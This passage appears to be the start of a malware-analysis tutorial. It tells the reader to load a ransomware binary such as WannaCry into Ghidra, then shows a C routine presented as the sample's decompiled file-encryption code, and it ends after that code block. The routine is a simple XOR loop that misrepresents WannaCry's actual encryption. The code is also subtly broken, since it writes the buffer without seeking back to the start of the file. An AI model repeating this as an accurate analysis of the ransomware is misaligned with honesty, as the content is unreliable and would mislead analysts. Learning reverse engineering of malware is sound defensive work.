1. Load the ransomware binary (e.g., **WannaCry**) into **Ghidra**.
2. Decompile the `main()` function and locate the **encryption routine**:
   ```c
   void encrypt_file(char *file_path, char *key) {
     FILE *fp = fopen(file_path, "rb+");
     fseek(fp, 0, SEEK_END);
     long size = ftell(fp);
     char *buffer = malloc(size);
     fread(buffer, 1, size, fp);
     for (int i = 0; i < size; i++) {
       buffer[i] ^= key[i % KEY_LEN]; // XOR Encryption
     }
     fwrite(buffer, 1, size, fp);
     fclose(fp);
   }
